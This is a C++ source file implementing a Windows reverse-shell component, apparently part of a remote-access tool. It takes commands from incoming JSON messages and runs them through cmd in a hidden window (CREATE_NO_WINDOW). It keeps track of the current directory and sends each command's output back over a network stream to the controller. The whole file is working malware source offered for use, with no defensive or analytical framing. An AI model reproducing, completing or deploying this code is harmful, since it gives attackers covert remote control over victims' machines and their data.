#include "ReverseShell.h"


std::string ReverseShell::executeCommand(const std::wstring & command) {
    std::array<wchar_t, 128> buffer{};
    std::string result;
    std::string completeCommand = "cmd /c cd "+currentDirectory+" & "+Converter::wstring2string(command)+" & echo. & cd";
    runCmd(completeCommand,result);
    size_t initialPos =  result.find_last_of('\n',result.find_last_not_of('\n'));
    std::string currentDirectorySubstring =  result.substr(initialPos+1,result.length()-initialPos-2);
    result = result.substr(0,initialPos);
    currentDirectory = currentDirectorySubstring;
    result.append("|"+currentDirectorySubstring);
    return result;
}



int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOutput) {
    HANDLE g_hChildStd_OUT_Rd = nullptr;
    HANDLE g_hChildStd_OUT_Wr = nullptr;
    HANDLE g_hChildStd_ERR_Rd = nullptr;
    HANDLE g_hChildStd_ERR_Wr = nullptr;

    SECURITY_ATTRIBUTES sa;
    // Set the bInheritHandle flag so pipe handles are inherited.
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;
    if (!CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa,
                    0)) { return 1; } // Create a pipe for the child process's STDERR.
    if (!SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT,
                              0)) { return 1; } // Ensure the read handle to the pipe for STDERR is not inherited.
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa,
                    0)) { return 1; } // Create a pipe for the child process's STDOUT.
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT,
                              0)) { return 1; } // Ensure the read handle to the pipe for STDOUT is not inherited

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;

    // Set up members of the PROCESS_INFORMATION structure.
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure.
    // This structure specifies the STDERR and STDOUT handles for redirection.
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process.
    CreateProcessA(
            nullptr,             // program name
            (LPSTR)commandToExecute.c_str(),       // command line
            nullptr,             // process security attributes
            nullptr,             // primary thread security attributes
            TRUE,             // handles are inherited
            CREATE_NO_WINDOW, // creation flags (this is what hides the window)
            nullptr,             // use parent's environment
            nullptr,             // use parent's current directory
            static_cast<LPSTARTUPINFOA>((&siStartInfo)),     // STARTUPINFO pointer
            &piProcInfo       // receives PROCESS_INFORMATION
    );

    CloseHandle(g_hChildStd_ERR_Wr);
    CloseHandle(g_hChildStd_OUT_Wr);

    // read output
#define BUFSIZE 4096
    DWORD dwRead;
    CHAR chBuf[BUFSIZE];
    bool bSuccess2 = FALSE;
    for (;;) { // read stdout
        bSuccess2 = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
        if (!bSuccess2 || dwRead == 0) break;
        std::string s(chBuf, dwRead);
        outOutput += s;
    }
    dwRead = 0;


    // The remaining open handles are cleaned up when this process terminates.
    // To avoid resource leaks in a larger application,
    // close handles explicitly.
    return 0;
}

ReverseShell::ReverseShell(const Stream &stream) : Sender(stream){
    actionMap["EXECUTE_COMMAND"]  = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &ReverseShell::executeCommandAndSendResult, json);
    };
}

void ReverseShell::executeCommandAndSendResult(nlohmann::json jsonObject){
    std::string command = jsonObject["command"];
    std::string resultOfCommand = executeCommand(Converter::string2wstring(command));
    stream.sendString(resultOfCommand.c_str());
}

void ReverseShell::send() {

}
